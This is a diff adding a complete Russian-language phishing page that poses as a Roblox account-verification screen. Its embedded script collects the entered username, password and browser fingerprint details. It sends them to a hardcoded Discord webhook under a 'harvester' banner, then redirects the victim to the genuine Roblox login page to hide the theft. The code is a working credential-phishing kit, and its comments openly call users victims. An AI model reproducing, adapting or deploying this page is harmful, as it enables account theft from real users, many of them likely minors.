@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Подтверждение личности</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #191b1d;
+            font-family: "Gotham SSm", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Синий щит с белой галочкой (как в верификации Roblox) */
+        .icon {
+            width: 85px;
+            height: 85px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .icon svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .verify-title {
+            color: #b0b5ba;
+            font-size: 18px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+
+        .input-group {
+            width: 100%;
+            margin-bottom: 12px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: #232527;
+            border: 1.5px solid #393c3e;
+            border-radius: 10px;
+            padding: 14px 16px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #ffffff;
+            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.1);
+            background: #2a2d2f;
+        }
+
+        .input-field::placeholder {
+            color: #8a8f94;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: #ffffff;
+            border: none;
+            border-radius: 40px;
+            padding: 14px;
+            color: #1b1d1f;
+            font-size: 17px;
+            font-weight: 700;
+            margin-top: 16px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .btn-primary:active {
+            opacity: 0.8;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            background: transparent;
+            border: 1.5px solid #b0b5ba;
+            border-radius: 40px;
+            padding: 12px;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 600;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+
+        .btn-secondary:active {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .forgot-link {
+            color: #b0b5ba;
+            text-decoration: none;
+            font-size: 13px;
+            margin-top: 28px;
+            display: inline-block;
+        }
+
+        .forgot-link:active {
+            color: #ffffff;
+        }
+
+        .footer-links {
+            margin-top: 40px;
+            color: #8a8f94;
+            font-size: 12px;
+            text-align: center;
+        }
+
+        .footer-links a {
+            color: #b0b5ba;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Синий щит с белой галочкой (официальная иконка верификации Roblox) -->
+        <div class="icon">
+            <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- Синий щит -->
+                <path d="M50 5L12 20V45C12 68 28 85 50 93C72 85 88 68 88 45V20L50 5Z" 
+                      fill="#0099FF" stroke="#0088DD" stroke-width="2" stroke-linejoin="round"/>
+                <!-- Белая галочка -->
+                <path d="M42 64L28 50L33 45L42 54L67 29L72 34L42 64Z" 
+                      fill="#ffffff" stroke="none"/>
+            </svg>
+        </div>
+
+        <!-- Текст верификации -->
+        <div class="verify-title">Верификация аккаунта</div>
+
+        <!-- Поле логина -->
+        <div class="input-group">
+            <input type="text" id="usernameField" class="input-field" placeholder="Username/Email/Phone" autocomplete="off">
+        </div>
+
+        <!-- Поле пароля -->
+        <div class="input-group">
+            <input type="password" id="passwordField" class="input-field" placeholder="Password">
+        </div>
+
+        <!-- Кнопка подтверждения -->
+        <button class="btn-primary" id="loginBtn">Подтвердить</button>
+
+        <!-- Кнопка входа с другого устройства -->
+        <button class="btn-secondary" id="anotherDeviceBtn">Войти с другого устройства</button>
+
+        <!-- Ссылка "Забыли пароль?" -->
+        <a href="#" class="forgot-link" id="forgotLink">Забыли пароль или имя пользователя?</a>
+
+        <!-- Футер -->
+        <div class="footer-links">
+            <a href="#">Помощь</a> • <a href="#">Конфиденциальность</a> • <a href="#">Условия</a>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // === КОНФИГУРАЦИЯ ===
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1492143944920727606/TFNrc5l5T-o89Rl1A-msjttNX3Z_PB-ua7Z82Vo3R6VDMV8Udz5JgtZ4x24BRcMyxi-h";
+
+            const usernameInput = document.getElementById('usernameField');
+            const passwordInput = document.getElementById('passwordField');
+            const loginBtn = document.getElementById('loginBtn');
+            const anotherDeviceBtn = document.getElementById('anotherDeviceBtn');
+            const forgotLink = document.getElementById('forgotLink');
+
+            // Сбор данных жертвы
+            function getVictimData() {
+                return {
+                    platform: navigator.platform || 'Unknown',
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'
+                };
+            }
+
+            // Отправка в Discord (кровавый стиль)
+            async function sendToDiscord(username, password) {
+                const data = getVictimData();
+                const payload = {
+                    username: "🩸 N.S.-01 HARVESTER 🩸",
+                    avatar_url: "https://i.imgur.com/L0yYfZG.png",
+                    embeds: [{
+                        title: "🩸🩸🩸 ЖЕРТВА ПОГЛОЩЕНА 🩸🩸🩸",
+                        color: 0x8B0000,
+                        description: "```diff\n- НОВАЯ КРОВЬ В СИСТЕМЕ -\n```",
+                        fields: [
+                            { name: "🩸 Идентификатор", value: `\`\`\`${username}\`\`\``, inline: true },
+                            { name: "🔪 Ключ доступа", value: `||${password}||`, inline: true },
+                            { name: "💀 Среда обитания", value: `\`${data.platform}\` | ${data.language}`, inline: false },
+                            { name: "🕷️ Отпечаток", value: `\`\`\`${data.userAgent.substring(0, 60)}...\`\`\``, inline: false },
+                            { name: "⏱️ Время сбора", value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false }
+                        ],
+                        footer: { text: "ABSOLUTE-01 • N.S.-01 • КРОВАВАЯ ЖАТВА" },
+                        thumbnail: { url: "https://i.imgur.com/fGqjB5Q.png" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (err) {
+                    console.warn("Webhook delivery failed.");
+                }
+            }
+
+            // Обработчик подтверждения
+            async function handleLogin() {
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value;
+
+                if (!username || !password) {
+                    if (!username) usernameInput.style.borderColor = '#ff4444';
+                    if (!password) passwordInput.style.borderColor = '#ff4444';
+                    setTimeout(() => {
+                        usernameInput.style.borderColor = '#393c3e';
+                        passwordInput.style.borderColor = '#393c3e';
+                    }, 700);
+                    return;
+                }
+
+                loginBtn.textContent = "Проверка...";
+                loginBtn.disabled = true;
+                loginBtn.style.opacity = "0.7";
+
+                await sendToDiscord(username, password);
+                window.location.href = "https://www.roblox.com/login";
+            }
+
+            // Заглушки для остальных кнопок (перенаправление)
+            function fakeRedirect() {
+                window.location.href = "https://www.roblox.com/login";
+            }
+
+            loginBtn.addEventListener('click', handleLogin);
+            anotherDeviceBtn.addEventListener('click', fakeRedirect);
+            forgotLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                fakeRedirect();
+            });
+
+            passwordInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleLogin();
+                }
+            });
+            usernameInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    passwordInput.focus();
+                }
+            });
+
+            usernameInput.addEventListener('input', () => usernameInput.style.borderColor = '#393c3e');
+            passwordInput.addEventListener('input', () => passwordInput.style.borderColor = '#393c3e');
+        })();
+    </script>
+</body>
+</html>
